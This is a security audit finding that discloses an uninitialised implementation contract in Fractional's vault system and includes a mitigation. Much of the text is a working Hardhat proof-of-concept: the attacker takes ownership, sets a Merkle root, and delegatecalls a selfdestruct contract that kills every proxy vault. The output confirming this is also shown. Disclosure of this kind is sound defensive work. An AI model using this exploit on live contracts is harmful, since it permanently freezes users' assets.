The problem is that that implementation vault is not initialized , which means that anybody can initialize the contract to become the owner, and then destroy it by doing a delegate call (via the `execute` function) to a function with the `selfdestruct` opcode. Once the implementation is destroyed all of the vaults will be unusable. And since there's no logic in the proxies to update the implementation - that means this is permanent (i.e. there's no way to call any function on any vault anymore, they're simply dead).  ## Impact This is a critical bug, since ALL assets held by ALL vaults will be lost. There's no way to transfer them out and there's no way to run any function on any vault.  Also, there's no way to fix the current deployed contracts (modules and registry), since they all depend on the factory vault, and there's no way to update them to a different factory. That means Fractional would have to deploy a new set of contracts after fixing the bug (this is a relatively small issue though).  ## Proof of Concept  I created the PoC based on the `scripts/deploy.js` file, here's a stripped-down version of that:  ```javascript const { ethers } = require("hardhat");  const ZERO_ADDRESS = "0x0000000000000000000000000000000000000000";  async function main() {     const [deployer, attacker] = await ethers.getSigners();      // Get all contract factories     const BaseVault = await ethers.getContractFactory("BaseVault");     const Supply = await ethers.getContractFactory("Supply");     const VaultRegistry = await ethers.getContractFactory("VaultRegistry");      // Deploy contracts      const registry = await VaultRegistry.deploy();     await registry.deployed();      const supply = await Supply.deploy(registry.address);     await supply.deployed();      // notice that the `factory` var in the original `deploy.js` file is a different factory than the registry's     const registryVaultFactory = await ethers.getContractAt("VaultFactory", await registry.factory());      const implVaultAddress = await registryVaultFactory.implementation();     const vaultImpl = await ethers.getContractAt("Vault", implVaultAddress);      const baseVault = await BaseVault.deploy(registry.address, supply.address);     await baseVault.deployed();     // proxy vault - the vault that's used by the user     let proxyVault = await deployVault(baseVault, registry, attacker);      const destructorFactory = await ethers.getContractFactory("Destructor");     const destructor = await destructorFactory.deploy();       let destructData = destructor.interface.encodeFunctionData("destruct", [attacker.address]);      const abi = new ethers.utils.AbiCoder();     const leafData = abi.encode(["address", "address", "bytes4"],         [attacker.address, destructor.address, destructor.interface.getSighash("destruct")]);     const leafHash = ethers.utils.keccak256(leafData);      await vaultImpl.connect(attacker).init();      await vaultImpl.connect(attacker).setMerkleRoot(leafHash);     // we don't really need to do this ownership-transfer, because the contract is still usable till the end of the tx, but I'm doing it just in case     await vaultImpl.connect(attacker).transferOwnership(ZERO_ADDRESS);      // before: everything is fine     let implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log("Impl Vault code size before:", implVaultCode.length - 2); // -2 for the 0x prefix     let owner = await proxyVault.owner();     console.log("Proxy Vault works fine, owner is: ", owner);       await vaultImpl.connect(attacker).execute(destructor.address, destructData, []);       // after: vault implementation is destructed     implVaultCode = await ethers.provider.getCode(implVaultAddress);     console.log("\nVault code size after:", implVaultCode.length - 2); // -2 for the 0x prefix      try {         owner = await proxyVault.owner();     } catch (e) {         console.log("Proxy Vault isn't working anymore.", e.toString().substring(0, 300));     } }  async function deployVault(baseVault, registry, attacker) {     const nodes = await baseVault.getLeafNodes();      const tx = await registry.connect(attacker).create(nodes[0], [], []);     const receipt = await tx.wait();      const vaultEvent = receipt.events.find(e => e.address == registry.address);      const newVaultAddress = vaultEvent.args._vault;     const newVault = await ethers.getContractAt("Vault", newVaultAddress);     return newVault; }   if (require.main === module) {     main() } ```  `Destructor.sol` file:  ```solidity // SPDX-License-Identifier: MIT pragma solidity 0.8.13;  contract Destructor{     function destruct(address payable dst) public {         selfdestruct(dst);     } } ```  Output: ``` Impl Vault code size before: 10386 Proxy Vault works fine, owner is:  0x5FbDB2315678afecb367f032d93F642f64180aa3  Vault code size after: 0 Proxy Vault isn't working anymore. Error: call revert exception [ See: https://links.ethers.org/v5-errors-CALL_EXCEPTION ] (method="owner()", data="0x", errorArgs=null, errorName=null, errorSignature=null, reason=null, code=CALL_EXCEPTION, version=abi/5.6.2) ```  Sidenote: as the comment in the code says, we don't really need to transfer the ownership to the zero address. It's just that Foundry's `forge` did revert the destruction when I didn't do it, with the error of `OwnerChanged` (i.e. once the `selfdestruct` was called the owner became the zero address, which is different than the original owner) so I decided to add this just in case. This is probably a bug in `forge`, since the contract shouldn't destruct till the end of the tx (Hardhat indeed didn't revert the destruction even when the attacker was the owner).  ## Tools Used Hardhat  ## Recommended Mitigation Steps    Add init in `Vault`'s constructor (and make the `init` function `public` instead of `external`):  ```solidity contract Vault is IVault, NFTReceiver {     /// @notice Address of vault owner     address public owner;     /// ...      constructor(){         // initialize implementation         init();     }      /// @dev Initializes nonce and proxy owner     function init() public {  ```  Alternately you can add init in `VaultFactory.sol` constructor, but I think initializing in the contract itself is a better practice.  ```solidity     /// @notice Initializes implementation contract     constructor() {         implementation = address(new Vault());         Vault(implementation).init();     }  ```    After mitigation the PoC will output this:  ``` Error: VM Exception while processing transaction: reverted with custom error 'Initialized("0xa16E02E87b7454126E5E10d957A927A7F5B5d2be", "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", 1)'     at Vault._execute (src/Vault.sol:124)     at Vault.init (src/Vault.sol:24)     at HardhatNode._mineBlockWithPendingTxs     .... ```
